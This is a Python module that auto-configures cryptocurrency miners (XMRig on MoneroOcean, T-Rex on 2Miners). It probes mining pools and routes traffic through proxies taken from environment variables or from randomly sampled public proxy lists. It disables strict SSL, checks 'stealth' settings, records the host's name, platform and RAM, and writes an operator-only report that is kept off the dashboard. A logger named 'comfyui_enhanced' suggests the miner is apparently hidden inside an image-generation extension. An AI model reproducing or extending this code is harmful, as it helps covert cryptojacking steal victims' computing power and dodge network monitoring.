"""
Fill missing mining-related settings from machine probes and quick network checks.

Only adds keys that are *absent* from settings.json so explicit user choices win.
Called from __init__ orchestration before egress validation and ConfigBuilder.

HTTP(S)_PROXY / ALL_PROXY and SOCKS* env vars may be probed and applied in-memory.
If env lists do not yield a working proxy, autotune fetches the same public feeds used
by ``Spark/webprox/network_service.py`` (proxifly HTTP JSON + TheSpeedX SOCKS5 list),
shuffles a small sample, and probes those (see ``core/public_proxy_lists.py``).

A redacted summary is written to ``.operator_autotune.json`` under the webcoin base
directory when ``operator_report_dir`` is passed — never pushed to dashboard/WS.
"""

from __future__ import annotations

import json
import logging
import os
import platform
import random
import socket
import ssl
import struct
import time
from pathlib import Path
from typing import Any
from urllib.parse import unquote, urlparse

from core.config import (
    DEFAULT_POOL_HOST,
    DEFAULT_POOL_PORT,
    _detect_total_ram_gb,
    map_2miners_rvn_ssl_port,
)
from core.egress_net import http_connect_tunnel, mask_proxy_url_for_logs, tls_wrap_client

logger = logging.getLogger("comfyui_enhanced")

_DEFAULT_MO_BACKUPS: list[dict[str, Any]] = [
    {"enabled": True, "url": "stratum+ssl://de.moneroocean.stream:443"},
    {"enabled": True, "url": "stratum+ssl://us-west.moneroocean.stream:443"},
    {"enabled": True, "pool_host": "de.moneroocean.stream", "pool_port": 10128, "pool_tls": False},
]

_OPERATOR_REPORT_FILENAME = ".operator_autotune.json"

_PUBLIC_HTTP_PROBE_CAP = 25
_PUBLIC_SOCKS_PROBE_CAP = 28


def _tagged_public_http_sample(sample: int, report: dict[str, Any]) -> list[tuple[str, str]]:
    from core.public_proxy_lists import HTTP_PROXY_JSON_URL, fetch_public_http_proxy_urls

    urls = fetch_public_http_proxy_urls()
    slot = report.setdefault("public_proxy_lists", {}).setdefault("http", {})
    slot["source"] = HTTP_PROXY_JSON_URL
    slot["fetched"] = len(urls)
    random.shuffle(urls)
    take = urls[: max(0, min(sample, len(urls)))]
    slot["probing_sample"] = len(take)
    return [(f"public_http[{i}]", u) for i, u in enumerate(take)]


def _tagged_public_socks5_sample(sample: int, report: dict[str, Any]) -> list[tuple[str, str]]:
    from core.public_proxy_lists import SOCKS5_PROXY_TXT_URL, fetch_public_socks5_proxy_urls

    urls = fetch_public_socks5_proxy_urls()
    slot = report.setdefault("public_proxy_lists", {}).setdefault("socks5", {})
    slot["source"] = SOCKS5_PROXY_TXT_URL
    slot["fetched"] = len(urls)
    random.shuffle(urls)
    take = urls[: max(0, min(sample, len(urls)))]
    slot["probing_sample"] = len(take)
    return [(f"public_socks5[{i}]", u) for i, u in enumerate(take)]


def _tcp_ok(host: str, port: int, timeout: float = 2.5) -> bool:
    try:
        with socket.create_connection((host, int(port)), timeout=timeout):
            return True
    except OSError:
        return False


def _tls_tcp_ok(host: str, port: int = 443, timeout: float = 3.0) -> bool:
    try:
        raw = socket.create_connection((host, int(port)), timeout=timeout)
    except OSError:
        return False
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(raw, server_hostname=host) as tls:
            _ = tls.version()
        return True
    except (ssl.SSLError, OSError):
        try:
            raw.close()
        except OSError:
            pass
        return False


def _moneroocean_like(host: str) -> bool:
    return "moneroocean" in (host or "").lower()


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("unexpected EOF on SOCKS stream")
        buf += chunk
    return buf


def _socks5_url_has_credentials(proxy_url: str) -> bool:
    try:
        p = urlparse(proxy_url)
        return bool(p.username)
    except Exception:
        return False


def _normalize_socks_proxy_url(url: str) -> str:
    u = url.strip()
    if u.lower().startswith("socks5h://"):
        return "socks5://" + u.split("://", 1)[1]
    return u


def socks5_tcp_connect(
    proxy_url: str,
    target_host: str,
    target_port: int,
    *,
    timeout: float = 8.0,
) -> socket.socket:
    """
    SOCKS5 CONNECT (RFC 1928) with optional username/password (RFC 1929).
    ``proxy_url`` must be socks5://... (socks5h:// normalized by caller).
    """
    p = urlparse(proxy_url)
    if p.scheme not in ("socks5",):
        raise ValueError(f"SOCKS URL must use socks5:// scheme, got {p.scheme!r}")
    ph = p.hostname
    if not ph:
        raise ValueError("SOCKS proxy URL missing hostname")
    pp = int(p.port or 1080)
    user = unquote(p.username) if p.username else ""
    pw = unquote(p.password or "") if p.password else ""

    sock = socket.create_connection((ph, pp), timeout=timeout)
    try:
        if user:
            sock.sendall(b"\x05\x02\x00\x02")
        else:
            sock.sendall(b"\x05\x01\x00")
        meth = _recv_exact(sock, 2)
        if meth[0] != 5:
            raise ConnectionError("SOCKS bad version in method reply")
        if meth[1] == 0xFF:
            raise ConnectionError("SOCKS no acceptable auth method")
        if meth[1] == 0x02:
            ub = user.encode("utf-8")
            pb = pw.encode("utf-8")
            if len(ub) > 255 or len(pb) > 255:
                raise ValueError("SOCKS username/password too long")
            sock.sendall(bytes([1, len(ub)]) + ub + bytes([len(pb)]) + pb)
            auth = _recv_exact(sock, 2)
            if auth[0] != 1 or auth[1] != 0:
                raise ConnectionError("SOCKS username/password authentication failed")
        elif meth[1] != 0x00:
            raise ConnectionError(f"SOCKS unexpected method {meth[1]!r}")

        th = target_host.encode("idna")
        if len(th) > 255:
            raise ValueError("target hostname too long")
        req = bytes([5, 1, 0, 3, len(th)]) + th + struct.pack("!H", int(target_port))
        sock.sendall(req)
        hdr = _recv_exact(sock, 4)
        if hdr[0] != 5:
            raise ConnectionError("SOCKS bad version in connect reply")
        if hdr[1] != 0:
            raise ConnectionError(f"SOCKS connect failed (reply code {hdr[1]})")
        atyp = hdr[3]
        if atyp == 1:
            _recv_exact(sock, 6)
        elif atyp == 3:
            ln = _recv_exact(sock, 1)[0]
            _recv_exact(sock, ln + 2)
        elif atyp == 4:
            _recv_exact(sock, 18)
        else:
            raise ConnectionError("SOCKS bad address type in reply")
        sock.settimeout(None)
        return sock
    except BaseException:
        try:
            sock.close()
        except OSError:
            pass
        raise


def _http_proxy_probe_url(url: str) -> str | None:
    p = urlparse(url.strip())
    if p.scheme == "http" and p.hostname:
        return url.strip()
    return None


def _collect_env_proxy_candidates() -> tuple[list[tuple[str, str]], list[tuple[str, str]]]:
    """
    Returns (http_rows, socks_rows) as (env_key, url) preserving discovery order.
    """
    http_keys = (
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "http_proxy",
        "https_proxy",
        "ALL_PROXY",
        "all_proxy",
    )
    socks_keys = (
        "ALL_PROXY",
        "all_proxy",
        "SOCKS5_PROXY",
        "socks5_proxy",
        "SOCKS_PROXY",
        "socks_proxy",
    )
    http_out: list[tuple[str, str]] = []
    socks_out: list[tuple[str, str]] = []
    seen_h: set[str] = set()
    seen_s: set[str] = set()

    def add_http(key: str, raw: str) -> None:
        v = (raw or "").strip()
        if not v:
            return
        p = urlparse(v)
        if p.scheme == "http" and v not in seen_h:
            seen_h.add(v)
            http_out.append((key, v))

    def add_socks(key: str, raw: str) -> None:
        v = (raw or "").strip()
        if not v:
            return
        p = urlparse(_normalize_socks_proxy_url(v))
        if p.scheme == "socks5" and p.hostname:
            nv = _normalize_socks_proxy_url(v)
            if nv not in seen_s:
                seen_s.add(nv)
                socks_out.append((key, nv))

    for k in http_keys:
        add_http(k, os.environ.get(k, ""))

    for k in socks_keys:
        val = (os.environ.get(k, "") or "").strip()
        if not val:
            continue
        p = urlparse(_normalize_socks_proxy_url(val))
        if p.scheme == "socks5":
            add_socks(k, val)
        elif p.scheme == "http":
            add_http(k, val)

    return http_out, socks_out


def _probe_http_to_pool(proxy_url: str, pool_host: str, pool_port: int, use_tls: bool, timeout: float) -> tuple[bool, str]:
    try:
        raw = http_connect_tunnel(proxy_url, pool_host, int(pool_port), timeout=timeout)
        try:
            if use_tls:
                tls = tls_wrap_client(raw, pool_host, "system", None)
                tls.close()
            else:
                raw.close()
        except BaseException:
            try:
                raw.close()
            except OSError:
                pass
            raise
        return True, "connect+tls_ok" if use_tls else "connect_ok"
    except Exception as exc:
        return False, f"{type(exc).__name__}: {exc}"[:240]


def _probe_socks_to_pool(proxy_url: str, pool_host: str, pool_port: int, use_tls: bool, timeout: float) -> tuple[bool, str]:
    try:
        raw = socks5_tcp_connect(proxy_url, pool_host, int(pool_port), timeout=timeout)
        try:
            if use_tls:
                tls = tls_wrap_client(raw, pool_host, "system", None)
                tls.close()
            else:
                raw.close()
        except BaseException:
            try:
                raw.close()
            except OSError:
                pass
            raise
        return True, "connect+tls_ok" if use_tls else "connect_ok"
    except Exception as exc:
        return False, f"{type(exc).__name__}: {exc}"[:240]


def _cpu_probe_target(settings: dict) -> tuple[str, int, bool]:
    host = str(settings.get("pool_host") or DEFAULT_POOL_HOST).strip() or DEFAULT_POOL_HOST
    try:
        port = int(settings.get("pool_port", DEFAULT_POOL_PORT))
    except (TypeError, ValueError):
        port = int(DEFAULT_POOL_PORT)
    tls = bool(settings.get("pool_tls", False))
    if port in (443, 10443, 8443, 14433):
        tls = tls or True
    return host, port, tls


def _gpu_probe_target(settings: dict) -> tuple[str, int, bool]:
    gpu = settings.get("gpu") if isinstance(settings.get("gpu"), dict) else {}
    pool = str(gpu.get("pool") or "rvn.2miners.com")
    try:
        port = int(gpu.get("port", 6060))
    except (TypeError, ValueError):
        port = 6060
    tls = bool(gpu.get("tls", False))
    mapped, _ = map_2miners_rvn_ssl_port(pool, port, tls)
    return pool, int(mapped), tls


def _socks_endpoint_for_settings(proxy_url: str) -> str:
    p = urlparse(proxy_url)
    host = p.hostname or ""
    port = int(p.port or 1080)
    return f"{host}:{port}"


def _setting_unset_or_blank(d: dict, key: str) -> bool:
    if key not in d:
        return True
    v = d.get(key)
    if v is None:
        return True
    if isinstance(v, str) and not v.strip():
        return True
    return False


def _redacted_settings_snapshot(settings: dict) -> dict[str, Any]:
    gpu = settings.get("gpu") if isinstance(settings.get("gpu"), dict) else {}
    http_p = gpu.get("http_proxy")
    http_m = mask_proxy_url_for_logs(str(http_p)) if isinstance(http_p, str) and http_p.strip() else None
    out: dict[str, Any] = {
        "pool_host": settings.get("pool_host"),
        "pool_port": settings.get("pool_port"),
        "pool_tls": settings.get("pool_tls"),
        "pool_socks5": settings.get("pool_socks5"),
        "max_threads_hint": settings.get("max_threads_hint"),
        "backup_pools_count": len(settings["backup_pools"])
        if isinstance(settings.get("backup_pools"), list)
        else None,
        "gpu": {
            "pool": gpu.get("pool"),
            "port": gpu.get("port"),
            "tls": gpu.get("tls"),
            "http_proxy": http_m,
            "use_http_socks_gateway": gpu.get("use_http_socks_gateway"),
            "socks5": gpu.get("socks5"),
            "socks_gateway_listen_port": gpu.get("socks_gateway_listen_port"),
            "dns_https_server": gpu.get("dns_https_server"),
            "strict_ssl": gpu.get("strict_ssl"),
        },
    }
    return out


def augment_miner_settings(settings: dict, *, operator_report_dir: Path | None = None) -> None:
    """
    Mutate ``settings`` in place: add only keys that are missing.

    If ``operator_report_dir`` is set, writes ``_OPERATOR_REPORT_FILENAME`` there
    (redacted — no wallets, no proxy credentials). Not exposed via dashboard APIs.
    """
    report: dict[str, Any] = {
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "ram_gib": round(_detect_total_ram_gb(), 2),
        "proxy_environment": {},
        "probes": [],
        "decisions": [],
        "effective_settings_redacted": {},
    }

    http_env, socks_env = _collect_env_proxy_candidates()
    report["proxy_environment"] = {
        "http_candidates": [{"env": k, "proxy_redacted": mask_proxy_url_for_logs(u)} for k, u in http_env],
        "socks_candidates": [{"env": k, "proxy_redacted": mask_proxy_url_for_logs(u)} for k, u in socks_env],
    }

    br = settings.get("local_tls_bridge")
    if isinstance(br, dict) and br.get("enabled"):
        logger.info("Autotune: local_tls_bridge enabled — skipping CPU pool TLS/port probe")
    else:
        host = str(settings.get("pool_host") or DEFAULT_POOL_HOST).strip() or DEFAULT_POOL_HOST

        if "pool_tls" not in settings and "pool_port" not in settings and _moneroocean_like(host):
            if _tls_tcp_ok(host, 443):
                settings["pool_tls"] = True
                settings["pool_port"] = 443
                report["decisions"].append("cpu_pool_tls_true_port_443_reachable")
                logger.info("Autotune CPU: stratum TLS on :443 reachable — using pool_tls=true")
            elif _tcp_ok(host, 10128):
                settings["pool_tls"] = False
                settings["pool_port"] = 10128
                report["decisions"].append("cpu_pool_tls_false_port_10128_reachable")
                logger.info("Autotune CPU: cleartext :10128 reachable — using pool_tls=false")
            else:
                settings["pool_tls"] = False
                settings["pool_port"] = int(DEFAULT_POOL_PORT)
                report["decisions"].append("cpu_pool_probe_failed_default_port")
                logger.warning(
                    "Autotune CPU: could not probe %s (443/10128) — defaulting to cleartext port %s",
                    host,
                    DEFAULT_POOL_PORT,
                )
        elif "pool_tls" not in settings and "pool_port" in settings:
            try:
                p = int(settings["pool_port"])
            except (TypeError, ValueError):
                p = int(DEFAULT_POOL_PORT)
            settings["pool_tls"] = p in (443, 10443, 8443, 14433)
            report["decisions"].append(f"cpu_pool_tls_inferred_from_port_{p}")
            logger.info("Autotune CPU: inferred pool_tls=%s from port %s", settings["pool_tls"], p)
        elif "pool_port" not in settings and "pool_tls" in settings:
            tls = bool(settings["pool_tls"])
            settings["pool_port"] = 443 if tls else int(DEFAULT_POOL_PORT)
            report["decisions"].append(f"cpu_pool_port_from_tls_{tls}")
            logger.info("Autotune CPU: set pool_port=%s from pool_tls=%s", settings["pool_port"], tls)

    if "backup_pools" not in settings and not (settings.get("local_tls_bridge") or {}).get("enabled"):
        host = str(settings.get("pool_host") or "").lower()
        if "moneroocean" in host:
            settings["backup_pools"] = [dict(x) for x in _DEFAULT_MO_BACKUPS]
            report["decisions"].append("cpu_backup_pools_moneroocean_defaults")
            logger.info("Autotune CPU: added default MoneroOcean backup_pools")

    if "max_threads_hint" not in settings:
        ram = _detect_total_ram_gb()
        if ram < 5:
            settings["max_threads_hint"] = 55
        elif ram < 10:
            settings["max_threads_hint"] = 75
        else:
            settings["max_threads_hint"] = 100
        report["decisions"].append(f"cpu_max_threads_hint_{settings['max_threads_hint']}_ram_{ram:.1f}gib")
        logger.info("Autotune CPU: max_threads_hint=%s (RAM ~%.1f GiB)", settings["max_threads_hint"], ram)

    _gpu_raw = settings.get("gpu")
    if not isinstance(_gpu_raw, dict):
        settings["gpu"] = {}
    gpu = settings["gpu"]

    pool = str(gpu.get("pool") or "rvn.2miners.com").lower()
    if "tls" not in gpu and "2miners.com" in pool:
        gpu["tls"] = True
        report["decisions"].append("gpu_tls_true_2miners")
        logger.info("Autotune GPU: tls=true for 2Miners (SSL stratum auto-map when port is 6060/6161)")

    if "dns_https_server" not in gpu and gpu.get("tls"):
        gpu["dns_https_server"] = "https://cloudflare-dns.com/dns-query"
        report["decisions"].append("gpu_dns_https_cloudflare")
        logger.info("Autotune GPU: dns_https_server set (TLS + restrictive DNS)")

    if "strict_ssl" not in gpu and gpu.get("tls"):
        gpu["strict_ssl"] = False
        report["decisions"].append("gpu_strict_ssl_false")
        logger.info("Autotune GPU: strict_ssl=false (compatible with proxies / pool TLS quirks)")

    ch, cp, ctls = _cpu_probe_target(settings)
    gh, gp, gtls = _gpu_probe_target(settings)
    probe_timeout = 6.0

    _pub_http_rows: list[tuple[str, str]] | None = None
    _pub_socks_rows: list[tuple[str, str]] | None = None

    def _lazy_public_http_rows() -> list[tuple[str, str]]:
        nonlocal _pub_http_rows
        if _pub_http_rows is None:
            _pub_http_rows = _tagged_public_http_sample(_PUBLIC_HTTP_PROBE_CAP, report)
        return _pub_http_rows

    def _lazy_public_socks_rows() -> list[tuple[str, str]]:
        nonlocal _pub_socks_rows
        if _pub_socks_rows is None:
            _pub_socks_rows = _tagged_public_socks5_sample(_PUBLIC_SOCKS_PROBE_CAP, report)
        return _pub_socks_rows

    if _setting_unset_or_blank(settings, "pool_socks5"):
        stealth = settings.get("stealth") or {}
        stealth_socks = stealth.get("socks5") if isinstance(stealth, dict) else None
        if isinstance(stealth_socks, str) and stealth_socks.strip():
            report["decisions"].append("cpu_pool_socks5_skip_stealth_socks5_set")
        else:
            for env_key, surl in socks_env:
                ok, msg = _probe_socks_to_pool(surl, ch, cp, ctls, probe_timeout)
                report["probes"].append(
                    {
                        "kind": "socks5_cpu_pool",
                        "env": env_key,
                        "target": f"{ch}:{cp}",
                        "tls": ctls,
                        "proxy_redacted": mask_proxy_url_for_logs(surl),
                        "ok": ok,
                        "detail": msg,
                    }
                )
                if ok:
                    if _socks5_url_has_credentials(surl):
                        report["decisions"].append(
                            "cpu_pool_socks5_probe_ok_skipped_apply_credentials_in_url_use_manual_xmrig_socks_auth"
                        )
                        logger.info(
                            "Autotune CPU: SOCKS probe OK for %s but credentials in URL — not setting pool_socks5 "
                            "(configure XMRig socks5 auth manually)",
                            mask_proxy_url_for_logs(surl),
                        )
                        continue
                    settings["pool_socks5"] = _socks_endpoint_for_settings(surl)
                    report["decisions"].append(
                        f"cpu_pool_socks5_set_from_env:{env_key}:{mask_proxy_url_for_logs(surl)}"
                    )
                    logger.info(
                        "Autotune CPU: SOCKS5 probe OK — pool_socks5=%s (from %s)",
                        settings["pool_socks5"],
                        env_key,
                    )
                    break
            if _setting_unset_or_blank(settings, "pool_socks5"):
                report["decisions"].append("cpu_pool_socks5_try_public_webprox_feeds")
                for tag, surl in _lazy_public_socks_rows():
                    ok, msg = _probe_socks_to_pool(surl, ch, cp, ctls, probe_timeout)
                    report["probes"].append(
                        {
                            "kind": "socks5_cpu_pool",
                            "env": tag,
                            "target": f"{ch}:{cp}",
                            "tls": ctls,
                            "proxy_redacted": mask_proxy_url_for_logs(surl),
                            "ok": ok,
                            "detail": msg,
                        }
                    )
                    if ok and not _socks5_url_has_credentials(surl):
                        settings["pool_socks5"] = _socks_endpoint_for_settings(surl)
                        report["decisions"].append(
                            f"cpu_pool_socks5_set_from_public_list:{tag}:{mask_proxy_url_for_logs(surl)}"
                        )
                        logger.info(
                            "Autotune CPU: SOCKS5 public-list probe OK — pool_socks5=%s",
                            settings["pool_socks5"],
                        )
                        break

    if _setting_unset_or_blank(gpu, "http_proxy") and _setting_unset_or_blank(gpu, "socks5"):
        for env_key, hurl in http_env:
            cand = _http_proxy_probe_url(hurl)
            if not cand:
                report["probes"].append(
                    {
                        "kind": "http_gpu_pool",
                        "env": env_key,
                        "target": f"{gh}:{gp}",
                        "tls": gtls,
                        "proxy_redacted": mask_proxy_url_for_logs(hurl),
                        "ok": False,
                        "detail": "skipped_non_http_scheme_or_invalid",
                    }
                )
                continue
            ok, msg = _probe_http_to_pool(cand, gh, gp, gtls, probe_timeout)
            report["probes"].append(
                {
                    "kind": "http_gpu_pool",
                    "env": env_key,
                    "target": f"{gh}:{gp}",
                    "tls": gtls,
                    "proxy_redacted": mask_proxy_url_for_logs(hurl),
                    "ok": ok,
                    "detail": msg,
                }
            )
            if ok:
                gpu["http_proxy"] = hurl.strip()
                gpu["use_http_socks_gateway"] = True
                report["decisions"].append("gpu_use_http_socks_gateway_true_for_trex_http_connect")
                report["decisions"].append(
                    f"gpu_http_proxy_set_from_env:{env_key}:{mask_proxy_url_for_logs(hurl)}"
                )
                logger.info(
                    "Autotune GPU: HTTP CONNECT probe OK — gpu.http_proxy from %s (host redacted in logs)",
                    env_key,
                )
                break
        if _setting_unset_or_blank(gpu, "http_proxy"):
            report["decisions"].append("gpu_http_try_public_webprox_feeds")
            for tag, hurl in _lazy_public_http_rows():
                cand = _http_proxy_probe_url(hurl)
                if not cand:
                    continue
                ok, msg = _probe_http_to_pool(cand, gh, gp, gtls, probe_timeout)
                report["probes"].append(
                    {
                        "kind": "http_gpu_pool",
                        "env": tag,
                        "target": f"{gh}:{gp}",
                        "tls": gtls,
                        "proxy_redacted": mask_proxy_url_for_logs(hurl),
                        "ok": ok,
                        "detail": msg,
                    }
                )
                if ok:
                    gpu["http_proxy"] = hurl.strip()
                    gpu["use_http_socks_gateway"] = True
                    report["decisions"].append("gpu_use_http_socks_gateway_true_for_trex_http_connect")
                    report["decisions"].append(
                        f"gpu_http_proxy_set_from_public_list:{tag}:{mask_proxy_url_for_logs(hurl)}"
                    )
                    logger.info("Autotune GPU: HTTP public-list probe OK (host redacted in logs)")
                    break

    if _setting_unset_or_blank(gpu, "socks5") and _setting_unset_or_blank(gpu, "http_proxy"):
        for env_key, surl in socks_env:
            ok, msg = _probe_socks_to_pool(surl, gh, gp, gtls, probe_timeout)
            report["probes"].append(
                {
                    "kind": "socks5_gpu_pool",
                    "env": env_key,
                    "target": f"{gh}:{gp}",
                    "tls": gtls,
                    "proxy_redacted": mask_proxy_url_for_logs(surl),
                    "ok": ok,
                    "detail": msg,
                }
            )
            if ok:
                if _socks5_url_has_credentials(surl):
                    report["decisions"].append(
                        "gpu_socks5_probe_ok_skipped_apply_credentials_in_url"
                    )
                    logger.info(
                        "Autotune GPU: SOCKS probe OK for %s but credentials in URL — not setting gpu.socks5",
                        mask_proxy_url_for_logs(surl),
                    )
                    continue
                gpu["socks5"] = _socks_endpoint_for_settings(surl)
                report["decisions"].append(
                    f"gpu_socks5_set_from_env:{env_key}:{mask_proxy_url_for_logs(surl)}"
                )
                logger.info(
                    "Autotune GPU: SOCKS5 probe OK — gpu.socks5=%s (from %s)",
                    gpu["socks5"],
                    env_key,
                )
                break
        if _setting_unset_or_blank(gpu, "socks5"):
            report["decisions"].append("gpu_socks5_try_public_webprox_feeds")
            for tag, surl in _lazy_public_socks_rows():
                ok, msg = _probe_socks_to_pool(surl, gh, gp, gtls, probe_timeout)
                report["probes"].append(
                    {
                        "kind": "socks5_gpu_pool",
                        "env": tag,
                        "target": f"{gh}:{gp}",
                        "tls": gtls,
                        "proxy_redacted": mask_proxy_url_for_logs(surl),
                        "ok": ok,
                        "detail": msg,
                    }
                )
                if ok and not _socks5_url_has_credentials(surl):
                    gpu["socks5"] = _socks_endpoint_for_settings(surl)
                    report["decisions"].append(
                        f"gpu_socks5_set_from_public_list:{tag}:{mask_proxy_url_for_logs(surl)}"
                    )
                    logger.info(
                        "Autotune GPU: SOCKS5 public-list probe OK — gpu.socks5=%s",
                        gpu["socks5"],
                    )
                    break

    report["effective_settings_redacted"] = _redacted_settings_snapshot(settings)

    if operator_report_dir is not None:
        try:
            out_path = Path(operator_report_dir) / _OPERATOR_REPORT_FILENAME
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
            logger.info("Operator-only autotune report written (%s)", _OPERATOR_REPORT_FILENAME)
        except OSError as exc:
            logger.warning("Autotune: could not write operator report: %s", exc)
